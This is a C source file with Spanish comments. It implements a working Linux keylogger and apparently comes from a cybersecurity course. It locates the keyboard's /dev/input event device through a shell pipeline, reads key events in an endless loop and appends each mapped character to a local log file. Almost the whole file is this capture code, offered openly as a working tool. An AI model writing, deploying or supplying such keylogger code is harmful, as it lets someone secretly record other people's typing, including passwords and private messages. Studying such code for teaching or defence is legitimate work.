#include <stdio.h> //Para operaciones de entrada y salida.
#include <fcntl.h> //Para manipulación de archivos y descriptores de archivos.
#include <unistd.h> //Provee acceso a la API del sistema POSIX, incluyendo operaciones con archivos.
#include <linux/input.h> //Define estructuras y constantes relacionadas con eventos de entrada en Linux.
#include <sys/stat.h> //Define la estructura de datos utilizada para obtener información sobre archivos.
#include <string.h> //Para funciones de manipulación de cadenas.
#include <stdlib.h> //Para funciones de utilidad general, como conversión de cadenas y gestión de memoria.
#include <errno.h> //Provee el mecanismo de manejo de errores.

#define LOGFILEPATH "/home/carlos30/Escritorio/Ciberseguridad/keylogger.txt"
//Aquí se define la ruta donde se almacenarán las teclas registradas.

char *obtenerEvento();
char mapearTecla(int codigo);
//Declaramos las dos funciones auxiliares que utilizaremos

int main(){
    struct input_event evento; //Estructura que almacena información sobre eventos de entrada.
    static char ruta_teclado[20] = "/dev/input/"; //Ruta al dispositivo de entrada de teclado. Se construye concatenando "/dev/input/" con el nombre del archivo de evento obtenido por obtenerEvento().
    strcat(ruta_teclado, obtenerEvento()); //Agrega el nombre del archivo de evento a la ruta base "/dev/input/".
    ruta_teclado[strlen(ruta_teclado)-1] = 0; //Elimina un posible salto de línea al final de la cadena.

    int dispositivo_teclado = open(ruta_teclado, O_RDONLY); //Abre el dispositivo de teclado en modo de solo lectura.
    if (dispositivo_teclado < 0) {
        perror("Error al abrir el dispositivo");
        return 1;
    }

    FILE *archivo = fopen(LOGFILEPATH, "a"); //Abre el archivo de registro en modo de "apéndice". Si no se puede abrir el archivo, se cierra el dispositivo de teclado y el programa termina.
    if (!archivo) {
        perror("Error al abrir el archivo de registro");
        close(dispositivo_teclado);
        return 1;
    }

    while (1) {
        read(dispositivo_teclado, &evento, sizeof(evento)); // Lee un evento del teclado.
        if (evento.type == EV_KEY && evento.value == 0) { //Filtra los eventos de tipo EV_KEY que indican que una tecla fue presionada y luego soltada.
            char tecla = mapearTecla(evento.code); //Convierte el código de la tecla en un carácter.
            if (tecla) {
                fputc(tecla, archivo); //Escribe el carácter en el archivo de registro.
                fflush(archivo);  //Asegura que los datos se escriban inmediatamente en el archivo.
            }
        }
    }

    fclose(archivo);
    close(dispositivo_teclado);
    return 0; //Se cierran el archivo de registro y el dispositivo de teclado antes de que el programa termine.
}

char *obtenerEvento(){
    static char evento[8];
    FILE *pipe = popen("cat /proc/bus/input/devices | grep -C 5 keyboard | grep -E -o 'event[0-9]'", "r");
    if (!pipe)
        exit(1); //Ejecuta un comando en la terminal y abre una tubería para leer su salida.

    fgets(evento, 8, pipe); //Lee el nombre del archivo de evento del teclado.
    pclose(pipe); //Cierra la tubería.
    return evento;
}

char mapearTecla(int codigo) {
    switch (codigo) {
        case KEY_A: return 'a';
        case KEY_B: return 'b';
        case KEY_C: return 'c';
        case KEY_D: return 'd';
        case KEY_E: return 'e';
        case KEY_F: return 'f';
        case KEY_G: return 'g';
        case KEY_H: return 'h';
        case KEY_I: return 'i';
        case KEY_J: return 'j';
        case KEY_K: return 'k';
        case KEY_L: return 'l';
        case KEY_M: return 'm';
        case KEY_N: return 'n';
        case KEY_O: return 'o';
        case KEY_P: return 'p';
        case KEY_Q: return 'q';
        case KEY_R: return 'r';
        case KEY_S: return 's';
        case KEY_T: return 't';
        case KEY_U: return 'u';
        case KEY_V: return 'v';
        case KEY_W: return 'w';
        case KEY_X: return 'x';
        case KEY_Y: return 'y';
        case KEY_Z: return 'z';
        case KEY_1: return '1';
        case KEY_2: return '2';
        case KEY_3: return '3';
        case KEY_4: return '4';
        case KEY_5: return '5';
        case KEY_6: return '6';
        case KEY_7: return '7';
        case KEY_8: return '8';
        case KEY_9: return '9';
        case KEY_0: return '0';
        case KEY_SPACE: return ' ';
        case KEY_ENTER: return '\n';
        case KEY_BACKSPACE: return '\b';
        default: return 0;
    }
}
